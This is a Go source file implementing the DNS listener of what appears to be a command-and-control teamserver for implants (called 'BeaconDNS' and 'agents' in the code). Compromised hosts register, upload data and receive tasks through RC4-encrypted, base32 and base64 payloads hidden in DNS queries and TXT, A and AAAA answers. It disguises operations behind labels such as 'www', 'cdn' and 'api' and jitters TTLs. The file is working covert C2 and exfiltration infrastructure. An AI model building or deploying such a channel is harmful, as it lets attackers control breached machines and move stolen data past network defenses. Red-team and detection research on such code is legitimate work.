package main

import (
	"bytes"
	"compress/zlib"
	"context"
	"crypto/rc4"
	"encoding/base32"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	mrand "math/rand/v2"
	"net"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

type Listener struct {
	transport *TransportDNS
}

type TransportDNS struct {
	Config TransportConfig
	Name   string
	Active bool

	udpServer *dns.Server
	tcpServer *dns.Server
	//ts        Teamserver

	mu             sync.Mutex
	upFrags        map[string]*dnsFragBuf
	downFrags      map[string]*dnsDownBuf
	upDoneCache    map[string]*dnsUpDone
	localInflights map[string]*localInflight
	needsReset     map[string]bool
	rng            *mrand.Rand
}

type TransportConfig struct { // DNSConfig
	HostBind     string   `json:"host_bind"`
	PortBind     int      `json:"port_bind"`
	Domain       string   `json:"domain"`
	Domains      []string `json:"-"`
	PktSize      int      `json:"pkt_size"`
	TTL          int      `json:"ttl"`
	EncryptKey   string   `json:"encrypt_key"`
	Protocol     string   `json:"protocol"`
	BurstEnabled bool     `json:"burst_enabled"`
	BurstSleep   int      `json:"burst_sleep"`
	BurstJitter  int      `json:"burst_jitter"`
}

func validConfig(config string) error {
	var conf TransportConfig
	err := json.Unmarshal([]byte(config), &conf)
	if err != nil {
		return err
	}

	if conf.HostBind == "" {
		return errors.New("host_bind is required")
	}
	if conf.PortBind < 1 || conf.PortBind > 65535 {
		return errors.New("port_bind must be 1-65535")
	}
	if conf.Domain == "" {
		return errors.New("domain is required")
	}

	keyLen := len(conf.EncryptKey)
	if keyLen < 6 || keyLen > 32 {
		return errors.New("encrypt_key must be 6-32 characters")
	}

	return nil
}

func (t *TransportDNS) Start(ts Teamserver) error {
	addr := net.JoinHostPort(t.Config.HostBind, strconv.Itoa(t.Config.PortBind))
	mux := dns.NewServeMux()
	mux.HandleFunc(".", t.handleDNS)

	t.udpServer = &dns.Server{Addr: addr, Net: "udp", Handler: mux}
	t.tcpServer = &dns.Server{Addr: addr, Net: "tcp", Handler: mux}
	t.Active = true

	var start_error error = nil

	go func() {
		err := t.udpServer.ListenAndServe()
		if err != nil {
			start_error = err
			t.Active = false
			fmt.Printf("[BeaconDNS] UDP listener error: %v\n", err)
		}
	}()

	go func() {
		err := t.tcpServer.ListenAndServe()
		if err != nil {
			start_error = err
			t.Active = false
			fmt.Printf("[BeaconDNS] TCP listener error: %v\n", err)
		}
	}()

	go t.cleanupLoop()

	time.Sleep(500 * time.Millisecond)

	return start_error
}

func (t *TransportDNS) Stop() error {

	t.Active = false

	ctx, cancel := context.WithTimeout(context.Background(), shutdownTimeout)
	defer cancel()

	var err error
	if t.udpServer != nil {
		if e := t.udpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	if t.tcpServer != nil {
		if e := t.tcpServer.ShutdownContext(ctx); e != nil {
			err = e
		}
	}
	return err
}

/// HANDLERS

func (t *TransportDNS) handleDNS(w dns.ResponseWriter, r *dns.Msg) {
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	baseTTL := uint32(t.Config.TTL)
	if baseTTL == 0 {
		baseTTL = 10
	}
	ttl := baseTTL + uint32(t.rng.IntN(60))

	for _, q := range r.Question {
		req := t.parseRequest(q)

		switch req.op {
		case "HI":
			if len(req.data) > 0 {
				t.handleHI(req, w)
			}
			m.Answer = append(m.Answer, t.buildAckResponse(req, ttl))

		case "PUT":
			var ack putAckInfo
			if len(req.data) > 0 {
				ack = t.handlePUT(req)
			}
			m.Answer = append(m.Answer, t.buildPutAckResponse(req, ack, ttl))

		case "GET":
			frame := t.handleGET(req, w)
			m.Answer = append(m.Answer, t.buildDataResponse(req, frame, ttl))

		case "HB":
			needsReset, hasPendingTasks := t.handleHB(req)
			m.Answer = append(m.Answer, t.buildHBResponse(req, needsReset, hasPendingTasks, ttl))

		default:
			answ := &dns.TXT{
				Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
				Txt: []string{"OK"},
			}
			m.Answer = append(m.Answer, answ)
		}
	}

	_ = w.WriteMsg(m)
}

func (t *TransportDNS) parseRequest(q dns.Question) *dnsRequest {
	labels := dns.SplitDomainName(q.Name)
	base := labels

	if len(t.Config.Domains) > 0 {
		for i := range labels {
			tail := strings.ToLower(strings.Join(labels[i:], "."))
			for _, dom := range t.Config.Domains {
				if tail == dom {
					base = labels[:i]
					break
				}
			}
			if len(base) < len(labels) {
				break
			}
		}
	}

	req := new(dnsRequest)
	req.qtype = q.Qtype
	req.qname = q.Name

	if len(base) < 5 {
		return req
	}

	req.sid = strings.ToLower(base[0])
	rawOp := strings.ToLower(base[1])

	switch rawOp {
	case "www", "hi":
		req.op = "HI"
	case "cdn", "put":
		req.op = "PUT"
	case "api", "get":
		req.op = "GET"
	case "hb":
		req.op = "HB"
	}

	if v, err := strconv.ParseUint(base[2], 16, 32); err == nil {
		req.seq = int(v ^ seqXorMask)
	}

	dataLabel := strings.ToUpper(strings.Join(base[4:], ""))
	enc := base32.StdEncoding.WithPadding(base32.NoPadding)
	if db, err := enc.DecodeString(dataLabel); err == nil {
		req.data = db
	}

	if match, _ := regexp.MatchString("^[0-9a-fA-F]{8}$", req.sid); !match {
		req.op = ""
	}

	maxPayload := t.Config.PktSize * 4
	if maxPayload <= 0 {
		maxPayload = defaultChunkSize
	}
	if len(req.data) > maxPayload {
		req.data = nil
	}

	return req
}

func (t *TransportDNS) handleHI(req *dnsRequest, w dns.ResponseWriter) {
	if len(req.data) < 8 {
		return
	}

	keyBytes, err := hex.DecodeString(t.Config.EncryptKey)
	if err != nil || len(keyBytes) != 16 {
		return
	}

	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return
	}

	fullBeat := make([]byte, len(req.data))
	cipher.XORKeyStream(fullBeat, req.data)

	if len(fullBeat) < 8 {
		return
	}

	agentType := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[:4]))
	agentId := fmt.Sprintf("%08x", binary.BigEndian.Uint32(fullBeat[4:8]))
	beat := fullBeat[8:]

	if !Ts.TsAgentIsExists(agentId) {
		externalIP := "" // extractExternalIP(w.RemoteAddr())
		_, _ = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, externalIP, true)
	}
	_ = Ts.TsAgentSetTick(agentId, t.Name)
}

func (t *TransportDNS) handleHB(req *dnsRequest) (needsReset bool, hasPendingTasks bool) {
	if req.sid != "" {
		_ = Ts.TsAgentSetTick(req.sid, t.Name)
	}

	// Check if this SID needs reset
	t.mu.Lock()
	if t.needsReset[req.sid] {
		needsReset = true
		delete(t.needsReset, req.sid)
	}
	t.mu.Unlock()

	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)

	var ackOffset, ackTaskNonce uint32
	if len(decrypted) >= 4 {
		ackOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}
	if len(decrypted) >= 12 {
		ackTaskNonce = binary.BigEndian.Uint32(decrypted[8:12])
	}

	t.mu.Lock()
	df, hasDf := t.downFrags[req.sid]
	if hasDf && df != nil {
		df.lastUpdate = time.Now()
		if df.total > 0 && ackOffset >= df.total && ackTaskNonce == df.taskNonce {
			delete(t.localInflights, req.sid)
			delete(t.downFrags, req.sid)
			df = nil
			hasDf = false
		}
	}
	t.mu.Unlock()

	if !hasDf || df == nil {
		taskData, taskNonce := t.fetchOrRetryTasks(req.sid)
		if len(taskData) > 0 {
			t.mu.Lock()
			t.downFrags[req.sid] = newDownBuf(taskData, taskNonce)
			t.mu.Unlock()
			hasPendingTasks = true
		}
	} else {
		hasPendingTasks = true
	}

	return needsReset, hasPendingTasks
}

func (t *TransportDNS) handleGET(req *dnsRequest, w dns.ResponseWriter) []byte {
	if req.sid != "" {
		_ = Ts.TsAgentSetTick(req.sid, t.Name)
	}

	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)

	var reqOffset uint32
	if len(decrypted) >= 4 {
		reqOffset = binary.BigEndian.Uint32(decrypted[0:4])
	}

	t.mu.Lock()
	df, exists := t.downFrags[req.sid]
	if exists && df != nil {
		df.lastUpdate = time.Now()
		if reqOffset > 0 && reqOffset <= df.total && reqOffset > df.off {
			df.off = reqOffset
		}
	}
	t.mu.Unlock()

	if df == nil || df.off >= df.total {
		if df != nil && df.off >= df.total {
			t.mu.Lock()
			delete(t.downFrags, req.sid)
			t.mu.Unlock()
			df = nil
		}

		taskData, taskNonce := t.fetchOrRetryTasks(req.sid)
		if len(taskData) > 0 {
			df = newDownBuf(taskData, taskNonce)
			t.mu.Lock()
			t.downFrags[req.sid] = df
			t.mu.Unlock()
		}
	}

	isTCP := w.RemoteAddr().Network() == "tcp"
	return t.buildResponseChunk(df, reqOffset, isTCP)
}

func (t *TransportDNS) handlePUT(req *dnsRequest) putAckInfo {
	ack := putAckInfo{}

	if len(req.data) == 0 {
		return ack
	}

	t.mu.Lock()
	if t.needsReset[req.sid] {
		ack.needsReset = true
		delete(t.needsReset, req.sid)
	}
	t.mu.Unlock()

	decrypted := rc4Crypt(req.data, t.Config.EncryptKey)
	ack = t.handlePutFragment(req.sid, req.seq, decrypted, ack)

	if req.sid != "" {
		_ = Ts.TsAgentSetTick(req.sid, t.Name)
	}
	return ack
}

func (t *TransportDNS) handlePutFragment(sid string, seq int, data []byte, ack putAckInfo) putAckInfo {
	_ = seq

	if sid == "" {
		return ack
	}

	if len(data) == 0 || len(data) <= 8 {
		_ = Ts.TsAgentProcessData(sid, data)
		return ack
	}

	var total, offset uint32
	var chunk []byte

	meta, rest, hasMeta := parseMetaV1(data)
	if hasMeta {
		if (meta.MetaFlags & 0x1) != 0 {
			t.mu.Lock()
			df, hasDf := t.downFrags[sid]
			var ackTaskNonce uint32
			shouldAck := false
			if hasDf && df != nil {
				ackTaskNonce = df.taskNonce
				if df.total > 0 && meta.DownAckOffset == df.total {
					shouldAck = true
				}
			}
			t.mu.Unlock()

			if shouldAck {
				t.mu.Lock()
				delete(t.localInflights, sid)
				if cur, ok := t.downFrags[sid]; ok && cur != nil && cur.taskNonce == ackTaskNonce {
					delete(t.downFrags, sid)
				}
				t.mu.Unlock()
			}
		}

		if len(rest) <= 8 {
			_ = Ts.TsAgentProcessData(sid, rest)
			return ack
		}
		total = binary.BigEndian.Uint32(rest[0:4])
		offset = binary.BigEndian.Uint32(rest[4:8])
		chunk = rest[8:]
	} else {
		total = binary.BigEndian.Uint32(data[0:4])
		offset = binary.BigEndian.Uint32(data[4:8])
		chunk = data[8:]
	}

	if total == 0 || total > maxUploadSize {
		_ = Ts.TsAgentProcessData(sid, data)
		return ack
	}

	// Populate ack info with totals
	ack.total = total

	if offset == 0 && total <= uint32(len(chunk)) {
		_ = Ts.TsAgentProcessData(sid, decompressUpstream(chunk))
		ack.complete = true
		ack.filled = total
		ack.lastReceivedOff = 0
		ack.nextExpectedOff = total
		return ack
	}

	t.mu.Lock()

	if done, exists := t.upDoneCache[sid]; exists && done.total == total {
		ack.complete = true
		ack.filled = done.total
		ack.lastReceivedOff = done.total
		ack.nextExpectedOff = done.total
		t.mu.Unlock()
		return ack
	}

	fb, ok := t.upFrags[sid]
	if !ok || fb.total != total || (offset == 0 && fb.highWater > 0) {
		fb = newFragBuf(total)
		t.upFrags[sid] = fb
	}

	// Track chunk size for gap detection
	chunkLen := uint32(len(chunk))
	if fb.chunkSize == 0 && chunkLen > 0 {
		fb.chunkSize = chunkLen
	}

	// Check for duplicate or out-of-bounds offset
	if offset >= fb.total || fb.seenOffsets[offset] {
		// Return current state even for duplicates
		ack.lastReceivedOff = fb.lastReceivedOff
		ack.nextExpectedOff = t.computeNextExpectedOffset(fb)
		ack.filled = fb.filled
		t.mu.Unlock()
		return ack
	}

	end := offset + chunkLen
	if end > fb.total {
		end = fb.total
	}
	n := end - offset
	copy(fb.buf[offset:end], chunk[:n])

	fb.seenOffsets[offset] = true
	fb.filled += n
	fb.lastReceivedOff = offset
	fb.expectedOff = end
	fb.lastUpdate = time.Now()

	if end > fb.highWater {
		fb.highWater = end
	}

	// Compute next expected offset based on gaps
	fb.nextExpectedOff = t.computeNextExpectedOffset(fb)

	// Update ack info
	ack.lastReceivedOff = fb.lastReceivedOff
	ack.nextExpectedOff = fb.nextExpectedOff
	ack.filled = fb.filled

	var completeBuf []byte
	if fb.filled >= fb.total {
		completeBuf = make([]byte, len(fb.buf))
		copy(completeBuf, fb.buf)
		t.upDoneCache[sid] = newUpDone(fb.total)
		delete(t.upFrags, sid)
		ack.complete = true
	}
	t.mu.Unlock()

	// Process data outside of lock to avoid blocking other goroutines
	if completeBuf != nil {
		_ = Ts.TsAgentProcessData(sid, decompressUpstream(completeBuf))
	}

	return ack
}

/// RESPONSE

func (t *TransportDNS) buildResponseChunk(df *dnsDownBuf, reqOffset uint32, isTCP bool) []byte {
	if df == nil || df.total == 0 {
		return nil
	}

	if reqOffset >= df.total {
		reqOffset = 0
	}

	maxChunk := t.Config.PktSize
	if !isTCP {
		if maxChunk <= 0 || maxChunk > dnsSafeChunkSize {
			maxChunk = dnsSafeChunkSize
		}
	} else {
		if maxChunk <= 0 {
			maxChunk = defaultChunkSize
		}
	}

	remaining := df.total - reqOffset
	chunkLen := remaining
	if chunkLen > uint32(maxChunk) {
		chunkLen = uint32(maxChunk)
	}

	frame := make([]byte, 8+chunkLen)
	binary.BigEndian.PutUint32(frame[0:4], df.total)
	binary.BigEndian.PutUint32(frame[4:8], reqOffset)
	copy(frame[8:], df.buf[reqOffset:reqOffset+chunkLen])
	return frame
}

func (t *TransportDNS) buildAckResponse(req *dnsRequest, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   net.ParseIP("127.0.0.1").To4(),
		}
	case dns.TypeAAAA:
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: net.ParseIP("::1").To16(),
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildPutAckResponse(req *dnsRequest, ack putAckInfo, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		if ack.needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		// Encode nextExpectedOff as 24-bit big-endian (up to 16MB)
		ip[1] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[3] = byte(ack.nextExpectedOff & 0xFF)
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		// For AAAA, use first 8 bytes for extended info
		ip := make(net.IP, 16)
		var flags byte
		if ack.complete {
			flags |= 0x01
		}
		if ack.needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		// nextExpectedOff (4 bytes)
		ip[1] = byte((ack.nextExpectedOff >> 24) & 0xFF)
		ip[2] = byte((ack.nextExpectedOff >> 16) & 0xFF)
		ip[3] = byte((ack.nextExpectedOff >> 8) & 0xFF)
		ip[4] = byte(ack.nextExpectedOff & 0xFF)
		// filled (4 bytes)
		ip[5] = byte((ack.filled >> 24) & 0xFF)
		ip[6] = byte((ack.filled >> 16) & 0xFF)
		ip[7] = byte((ack.filled >> 8) & 0xFF)
		ip[8] = byte(ack.filled & 0xFF)
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildHBResponse(req *dnsRequest, needsReset bool, hasPendingTasks bool, ttl uint32) dns.RR {
	switch req.qtype {
	case dns.TypeA:
		ip := make(net.IP, 4)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		ip[1] = 0
		ip[2] = 0
		ip[3] = 0
		return &dns.A{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
			A:   ip,
		}
	case dns.TypeAAAA:
		ip := make(net.IP, 16)
		var flags byte
		if hasPendingTasks {
			flags |= 0x01
		}
		if needsReset {
			flags |= 0x02
		}
		ip[0] = flags
		return &dns.AAAA{
			Hdr:  dns.RR_Header{Name: req.qname, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: ttl},
			AAAA: ip,
		}
	default:
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{"OK"},
		}
	}
}

func (t *TransportDNS) buildDataResponse(req *dnsRequest, frame []byte, ttl uint32) dns.RR {
	if len(frame) == 0 {
		return &dns.TXT{
			Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
			Txt: []string{""},
		}
	}

	encrypted := rc4Crypt(frame, t.Config.EncryptKey)
	b64Str := base64.StdEncoding.EncodeToString(encrypted)

	var chunks []string
	for len(b64Str) > 255 {
		chunks = append(chunks, b64Str[:255])
		b64Str = b64Str[255:]
	}
	chunks = append(chunks, b64Str)

	return &dns.TXT{
		Hdr: dns.RR_Header{Name: req.qname, Rrtype: dns.TypeTXT, Class: dns.ClassINET, Ttl: ttl},
		Txt: chunks,
	}
}

// Task Fetching (unified for GET and HB)
func (t *TransportDNS) fetchOrRetryTasks(sid string) ([]byte, uint32) {
	t.mu.Lock()
	existingInflight, hasInflight := t.localInflights[sid]
	t.mu.Unlock()

	if hasInflight && existingInflight != nil {
		existingInflight.attempts++
		return existingInflight.data, existingInflight.nonce
	}

	maxDataSize := t.Config.PktSize * 256
	if maxDataSize <= 0 || maxDataSize > maxDownloadSize {
		maxDataSize = maxDownloadSize
	}

	p, err := Ts.TsAgentGetHostedAll(sid, maxDataSize)
	if err != nil || len(p) == 0 {
		return nil, 0
	}

	taskNonce := uint32(time.Now().UnixNano()&0xFFFFFFFF) ^ t.rng.Uint32()
	origLen := len(p)
	payload, flags := compressPayload(p)
	taskData := buildTaskFrame(payload, taskNonce, flags, origLen)

	t.mu.Lock()
	t.localInflights[sid] = newInflight(taskData, taskNonce)
	t.mu.Unlock()

	return taskData, taskNonce
}

func (t *TransportDNS) ackDelivery(sid string, ackTaskNonce uint32) {
	t.mu.Lock()
	defer t.mu.Unlock()

	df, hasDf := t.downFrags[sid]
	if !hasDf || df == nil {
		return
	}

	if ackTaskNonce == df.taskNonce {
		delete(t.localInflights, sid)
		delete(t.downFrags, sid)
	}
}

// computeNextExpectedOffset finds the next missing offset based on chunk size
func (t *TransportDNS) computeNextExpectedOffset(fb *dnsFragBuf) uint32 {
	if fb.chunkSize == 0 {
		return fb.highWater
	}

	// Scan from start to find first gap
	for off := uint32(0); off < fb.total; off += fb.chunkSize {
		if !fb.seenOffsets[off] {
			return off
		}
	}
	return fb.total
}

/// CLEANUP

func (t *TransportDNS) cleanupLoop() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()

	for t.Active {
		select {
		case <-ticker.C:
			t.cleanupStaleEntries()
		}
	}
}

func (t *TransportDNS) cleanupStaleEntries() {
	now := time.Now()

	t.mu.Lock()
	defer t.mu.Unlock()

	// Cleanup stale upload fragments
	for sid, fb := range t.upFrags {
		if now.Sub(fb.lastUpdate) > staleTimeout {
			delete(t.upFrags, sid)
		}
	}

	// Cleanup stale download buffers
	for sid, db := range t.downFrags {
		if now.Sub(db.lastUpdate) > downTimeout {
			delete(t.downFrags, sid)
		}
	}

	// Cleanup expired dedup cache
	for sid, done := range t.upDoneCache {
		if now.Sub(done.doneAt) > dedupTimeout {
			delete(t.upDoneCache, sid)
		}
	}

	// Cleanup stale inflights
	for sid, inf := range t.localInflights {
		if now.Sub(inf.createdAt) > inflightTimeout || inf.attempts > maxInflightAttempts {
			delete(t.localInflights, sid)
		}
	}
}

/// UTILS

// Constants
const (
	seqXorMask       = 0x39913991
	maxUploadSize    = 4 << 20 // 4 MB
	maxDownloadSize  = 4 << 20 // 4 MB
	minCompressSize  = 2048
	dnsSafeChunkSize = 280
	defaultChunkSize = 4096
	metaV1Size       = 8
	frameHeaderSize  = 9 // flags:1 + nonce:4 + origLen:4

	staleTimeout        = 5 * time.Minute
	dedupTimeout        = 5 * time.Minute
	downTimeout         = 10 * time.Minute
	inflightTimeout     = 5 * time.Minute
	maxInflightAttempts = 10
	cleanupInterval     = 60 * time.Second
	shutdownTimeout     = 2 * time.Second
)

// Types
type dnsFragBuf struct {
	total           uint32
	buf             []byte
	filled          uint32
	highWater       uint32
	expectedOff     uint32
	lastUpdate      time.Time
	seenOffsets     map[uint32]bool
	lastReceivedOff uint32
	nextExpectedOff uint32
	chunkSize       uint32
}

type dnsDownBuf struct {
	total      uint32
	off        uint32
	buf        []byte
	taskNonce  uint32
	lastUpdate time.Time
}

type dnsUpDone struct {
	total  uint32
	doneAt time.Time
}

type localInflight struct {
	data      []byte
	nonce     uint32
	createdAt time.Time
	attempts  int
}

type metaV1 struct {
	Version       byte
	MetaFlags     byte
	Reserved      uint16
	DownAckOffset uint32
}

type dnsRequest struct {
	sid   string
	op    string
	seq   int
	data  []byte
	qtype uint16
	qname string
}

type putAckInfo struct {
	lastReceivedOff uint32
	nextExpectedOff uint32
	total           uint32
	filled          uint32
	needsReset      bool
	complete        bool
}

// Constructors
func newFragBuf(total uint32) *dnsFragBuf {
	fb := new(dnsFragBuf)
	fb.total = total
	fb.buf = make([]byte, total)
	fb.lastUpdate = time.Now()
	fb.seenOffsets = make(map[uint32]bool)
	fb.lastReceivedOff = 0
	fb.nextExpectedOff = 0
	fb.chunkSize = 0
	return fb
}

func newDownBuf(data []byte, nonce uint32) *dnsDownBuf {
	db := new(dnsDownBuf)
	db.total = uint32(len(data))
	db.buf = data
	db.taskNonce = nonce
	db.lastUpdate = time.Now()
	return db
}

func newInflight(data []byte, nonce uint32) *localInflight {
	inf := new(localInflight)
	inf.data = data
	inf.nonce = nonce
	inf.createdAt = time.Now()
	inf.attempts = 1
	return inf
}

func newUpDone(total uint32) *dnsUpDone {
	ud := new(dnsUpDone)
	ud.total = total
	ud.doneAt = time.Now()
	return ud
}

// Utility Functions
func rc4Crypt(data []byte, keyHex string) []byte {
	if len(data) == 0 {
		return data
	}
	keyBytes, err := hex.DecodeString(keyHex)
	if err != nil || len(keyBytes) != 16 {
		return data
	}
	cipher, err := rc4.NewCipher(keyBytes)
	if err != nil {
		return data
	}
	result := make([]byte, len(data))
	cipher.XORKeyStream(result, data)
	return result
}

func parseMetaV1(data []byte) (metaV1, []byte, bool) {
	var m metaV1
	if len(data) < metaV1Size {
		return m, data, false
	}
	m.Version = data[0]
	m.MetaFlags = data[1]
	m.Reserved = binary.LittleEndian.Uint16(data[2:4])
	m.DownAckOffset = binary.LittleEndian.Uint32(data[4:8])
	return m, data[metaV1Size:], true
}

func compressPayload(data []byte) (payload []byte, flags byte) {
	if len(data) <= minCompressSize {
		return data, 0
	}

	var zbuf bytes.Buffer
	wz, err := zlib.NewWriterLevel(&zbuf, zlib.BestCompression)
	if err != nil {
		return data, 0
	}

	if _, err := wz.Write(data); err != nil {
		wz.Close()
		return data, 0
	}

	if err := wz.Close(); err != nil {
		return data, 0
	}

	compressed := zbuf.Bytes()
	if len(compressed) > 0 && len(compressed) < len(data) {
		return compressed, 1
	}
	return data, 0
}

func decompressUpstream(data []byte) []byte {
	if len(data) <= 5 {
		return data
	}

	flags := data[0]
	origLen := binary.LittleEndian.Uint32(data[1:5])
	payload := data[5:]

	if (flags & 0x1) != 0 {
		if origLen > 0 && origLen <= maxUploadSize {
			zr, err := zlib.NewReader(bytes.NewReader(payload))
			if err == nil {
				decompressed := make([]byte, origLen)
				n, errRead := zr.Read(decompressed)
				zr.Close()
				if errRead == nil || (n > 0 && n == int(origLen)) {
					return decompressed[:n]
				}
			}
		}
	} else if origLen > 0 && origLen <= uint32(len(payload)) {
		return payload[:origLen]
	}
	return data
}

func buildTaskFrame(payload []byte, nonce uint32, flags byte, origLen int) []byte {
	frame := make([]byte, frameHeaderSize+len(payload))
	frame[0] = flags
	binary.LittleEndian.PutUint32(frame[1:5], nonce)
	binary.LittleEndian.PutUint32(frame[5:9], uint32(origLen))
	copy(frame[frameHeaderSize:], payload)
	return frame
}
